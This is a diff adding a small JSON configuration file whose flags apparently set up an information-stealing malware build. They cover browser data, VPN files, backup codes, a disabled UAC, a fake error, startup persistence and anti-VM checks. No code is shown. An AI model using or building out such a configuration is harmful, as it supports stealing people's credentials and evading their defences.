@@ -1,0 +1,12 @@
+{
+  "games": true,
+  "browsers": true,
+  "filevpn": true,
+  "backupcodes": true,
+  "wallet": false,
+  "disableuac": true,
+  "computerinfo": true,
+  "fakeerror": true,
+  "startup": true,
+  "antivm": false
+}
